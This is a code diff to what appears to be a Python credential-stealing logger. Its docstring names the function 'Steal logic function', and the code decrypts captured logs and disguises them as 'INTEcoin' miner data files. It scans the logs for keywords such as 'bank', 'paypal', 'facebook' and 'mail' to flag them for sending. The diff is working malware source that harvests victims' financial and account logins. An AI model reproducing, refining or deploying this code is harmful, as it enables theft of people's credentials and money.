@@ -110,6 +110,8 @@ def parse(key):
 def results():
     """
     Steal logic function.
+    INTEcoin - Holds the encrypted data which deletes after the function finishes copying the file.
+    INTEcoin0 - Copies the decrypted data from INTEcoin and runs a check for keywords.
     """
     importantWords = ["bank", "hmo", "facebook", "mail", "paypal"]
     toSend = False
@@ -123,10 +125,8 @@ def results():
             continue
         message += byt
 
-    filename= LOGS_PATH + "INTEcoin" + str(random.randint(1,10000)) + ".dat" # Save encrypted data as "INTEcoins"
-
     message = ""  # Reusing the parameter
-    with open(filename, "wb") as file: # Saving the data in the new
+    with open(LOGS_PATH + "INTEcoin0.dat", "wb") as file: # Saving the data in the new file
         for mess in accumulatedLog:
             message += Encryption.decrypt(mess.encode()) # Decrypt the data
             file.write(mess.encode()) # Write the data on a random file for the "miner"
